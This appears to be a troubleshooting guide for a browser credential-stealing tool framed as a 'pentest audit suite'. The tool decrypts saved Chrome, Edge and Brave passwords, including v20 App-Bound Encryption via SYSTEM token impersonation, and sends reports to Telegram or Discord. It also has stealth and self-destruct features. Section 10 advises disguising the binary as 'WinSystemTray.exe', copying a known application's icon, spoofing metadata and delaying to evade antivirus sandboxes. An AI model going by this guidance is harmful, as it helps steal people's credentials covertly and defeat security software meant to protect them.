# Common Troubleshooting (English)

This document outlines frequent issues encountered during the build, obfuscation, and execution of the project, and how to resolve them.

---

## 1. PyArmor: The term 'pyarmor' is not recognized

### Symptom
Attempting to run `pyarmor` results in an error message indicating the command is not recognized.

### Cause
This typically happens for two reasons:
1. The Python scripts directory (e.g., `C:\Python314\Scripts\`) is not correctly added to the system PATH.
2. The PyArmor installation preferred the direct CLI module instead of creating a global executable.

### Solution (Using build.py)
To prevent manual errors and PATH issues, use the included automation script:
```powershell
python build.py --name "AppName"
```

Alternatively, use the direct module entry point:
```powershell
python -m pyarmor.cli --version
```

---

## 2. Syntax Error in `pyarmor pack` (Version Incompatibility)

### Symptom
Receiving error messages for unknown arguments or commands when using `pyarmor pack`, following older tutorials.

### Cause
You have installed **PyArmor 8.x or 9.x**, where the bundling workflow changed significantly compared to version 7. The `pack` command no longer exists in its previous form, and arguments have been restructured.

### Solution for PyArmor 9+
Use the `gen --pack` command. Below is the equivalent to `--onefile --noconsole`:

1. **Configure PyInstaller Options**:
   Set the executable name and console flags in PyArmor's local configuration:
   ```powershell
   python -m pyarmor.cli cfg pack:pyi_options="--onefile --noconsole --name SysHealth"
   ```

2. **Run Execution/Bundle**:
   Generate the obfuscated bundle using the `--pack` flag:
   ```powershell
   python -m pyarmor.cli gen --pack onefile main.py
   ```

3. **Verification**:
   The output produced will be in the `dist/` directory. Note that if using the **Trial version**, there are limits on script complexity and obfuscation.

---

## 3. Report not sent (Network Error)

### Symptom
The script finishes but you do not receive the message on Telegram or Discord.

### Cause
Internet micro-outages, unstable DNS, or temporary rate-limiting by the APIs.

### Solution
The suite implements automatic **network resilience** using a retry decorator (3 attempts with exponential backoff). If it fails after all retries, the script **will not delete** the local report file (even if `--no-wipe` is not used) to ensure the audit data is not lost. You can manually recover the report from the `.audit/` folder.

---

## 4. Console window briefly appears at startup (Stealth Mode)

### Symptom
When running the script or `.exe` with `-s` / `--stealth`, the command window is visible for a second before hiding.

### Cause
Console hiding is deferred until after argument parsing and module imports. This prevents the script from dying silently in the background if a critical library (like `pywin32`) is missing on the target PC.

### Solution
This is a design choice to ensure robustness. If you need it to be 100% invisible from millisecond zero, you must compile using `python build.py --noconsole`.

---

## 5. Passwords show strange symbols or `[AES-GCM Error]`

### Symptom
In the HTML/CSV report, the password field shows strange characters, or values like `[AES-GCM Error]`, `[No AES Key]`, or `[Not Decrypted]`.

### Cause
Chromium uses **two different encryption schemes** that can coexist in the same profile database:

1. **AES-GCM (v80+)**: Blobs have the `v10` prefix and require the master key from the `Local State` file.
2. **DPAPI Legacy (<v80)**: Blobs encrypted directly by Windows, with no prefix.

The error markers indicate:

| Marker | Cause |
| :--- | :--- |
| `[No AES Key]` | `v10` blob but `Local State` could not be read. |
| `[Invalid Blob]` | The `v10` blob is truncated or corrupt. |
| `[AES-GCM Error]` | The key exists but does not decrypt this blob (and DPAPI also failed). |
| `[Not Decrypted]` | Legacy blob without prefix that DPAPI cannot decrypt in this session. |

### Solution
1. Run with **Administrator** permissions to ensure DPAPI can access the current user's keys.
2. If the browser is open, use **`--auto-kill`** to close the process and release the database lock.
3. If you see `[No AES Key]`, the profile's `Local State` might be corrupt or belong to another Windows user.

---

## 6. "Permission Denied" Error when deleting logs or reports

### Symptom
The Dashboard or script fails when trying to clean the `.audit/` folder or the `pentest_audit.log` file.

### Cause
Windows blocks files that another process is writing to. If an audit failed halfway, the log handler might have remained open.

### Solution
1. Ensure no other instance is running (check Task Manager).
2. The suite includes a "Logger Guard" that closes streams before attempting to delete. If the problem persists, restart the application.

---

## 7. Self-Destruct did not delete the .exe

### Symptom
You activated `--self-destruct` but the file remains in the folder after execution.

### Cause
The Windows `del` command can fail if the file is locked by:
1. Windows Explorer (if you have the folder open and the file selected).
2. An Antivirus scanning the binary at that moment.

### Solution
Wait a few seconds. The command has a 3s delay to allow the main process to exit before deleting itself. Avoid having the output folder open in Explorer during testing.

---

## 8. Chrome does not detect profiles even though they are installed (`0 profiles found`)

### Symptom
The log shows `Found 0 profiles to process.` but you have Chrome installed with saved passwords.

### Possible Cause 1 — Profile not detected by name
The detector looks for folders named `Default`, `Guest Profile`, or `Profile N`. If your profile has another name (rare, but possible in modified installations), it won't be found.

### Possible Cause 2 — Empty database
The suite validates that the `Login Data` file has `size > 0`. A newly created profile or one without saved passwords has an empty DB and is discarded.

### Possible Cause 3 — Browser locking the DB
Chrome has an exclusive lock on `Login Data` while it is running.

### Solution
- Activate **`--auto-kill`** (or the equivalent option in the Builder) to close the browser before auditing.
- Manually verify that the `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` folder exists and is not empty.

---

## 9. "Database is locked" Error (SQLite)

### Symptom
Even using `--auto-kill`, the log shows that the `Login Data` database is locked and cannot be copied.

### Cause
This typically occurs when a cloud synchronization service (like **OneDrive**, **Google Drive**, or **Dropbox**) is attempting to back up the browser profile at that exact moment, keeping a handle open on the file.

### Solution
1. Temporarily pause cloud file synchronization.
2. If the problem persists, check for "orphan" Chrome or Edge processes in Task Manager that `--auto-kill` might have missed (sometimes happens with extension sub-processes).

---

## 10. Heuristic Detection (AV False Positives)

### Symptom
Your obfuscated and signed binary is deleted by the Antivirus immediately after being generated or when attempting to run it.

### Cause
The combination of **bundling (PyInstaller)** + **obfuscation (PyArmor)** + **network behavior (Webhooks)** is a pattern that AVs flag as suspicious by default (heuristic detection).

### Solution
1. **Don't use the default name**: Change the filename to something generic like `WinSystemTray.exe`.
2. **Change the Icon**: Using the default Python icon is an immediate red flag. Use one from a known application.
3. **Increase Initial Delay**: Set a delay of at least 30-60 seconds in the Builder. Many AV sandboxes give up if they see no activity in the first few seconds.
4. **Metadata Spoofing**: Make sure to fill in the Version, Company, and Description fields in the Builder to make the binary look legitimate.

---

## 11. Dashboard won't open (ModuleNotFoundError)

### Symptom
When running `python gui_app.py`, you receive an error saying that the `customtkinter` or `PIL` module cannot be found.

### Cause
GUI dependencies are missing from your current environment.

### Solution
Install the full set of dependencies:
```powershell
pip install -r requirements.txt
```
If the error persists specifically with `PIL` (Pillow), reinstall it manually:
```powershell
pip install --force-reinstall Pillow
```

---

## 12. Support and Troubleshooting for App-Bound Encryption v20 (Chrome, Edge, Brave)

### Symptom
On recent versions of Chromium-based browsers (Chrome 127+, Edge 127+, Brave 130+), recovered credentials might show `[Not Decrypted]` or output specific logs like:
- `Unsupported flag: 232` / `Unsupported flag: 233`
- `OpenProcess on winlogon.exe failed (Access Denied)`
- `Failed to decrypt CNG blob with any known browser key`

### Technical Cause and V20 Architecture
Starting with Chromium 127+, Google introduced **App-Bound Encryption (ABE)**. Passwords and cookies now use the **`v20`** blob prefix (instead of `v10` or `v11`). 
The suite **implements native and complete support for decrypting V20** via a three-phase architecture:

1. **Token Impersonation (SYSTEM)**: The suite locates `winlogon.exe`, duplicates its security token (`SYSTEM`), and impersonates it to acquire the necessary machine cryptographic privileges required to invoke Windows' DPAPI.
2. **DPAPI Encrypted Layer Decryption**: Standard and system-level `CryptUnprotectData` API calls are chained to decrypt the wrapper.
3. **Key Mapping & CNG Decryption**: 
   - **Chrome / Edge**: Use keys stored in the system's Microsoft Software Key Storage Provider (CNG) named `Google Chromekey1` and `Microsoft Edgekey1`. Decryption is orchestrated using `ctypes` coupled with a proprietary XOR mask.
   - **Brave (v130+)**: Implements a streamlined security approach. Once the DPAPI layer is stripped, the payload contains the raw **32-byte** AES-256 master key directly (identified by flag `'direct'` / initial byte `232` or `0xE8`), requiring no COM elevation service or XOR steps.

### Common Troubleshooting and Diagnosis

| Error / Symptom | Cause | Solution |
| :--- | :--- | :--- |
| `OpenProcess on winlogon.exe failed` | The script is running without high-integrity privileges required to access system-level handles. | **Run the main script (`main.py` or compiled `.exe`) as Administrator.** (Right-click -> Run as Administrator). |
| `Unsupported flag: 232` | An older suite version is running, lacking support for Brave's direct 32-byte key parser. | Update the suite. The current parser automatically detects 32-byte payloads or direct flags and extracts the final key on the fly. |
| `Failed to decrypt CNG blob...` | The CNG encryption keys or database belongs to a different Windows user profile. | Make sure you are auditing the real user profile that initialized the Windows active session. |
| `[Not Decrypted]` with Admin privileges | The `ChromeElevationService` or `BraveElevationService` is not correctly registered or running. | Open Windows Services (`services.msc`) and verify that the target browser's elevation service is enabled and set to `Manual` startup type. |
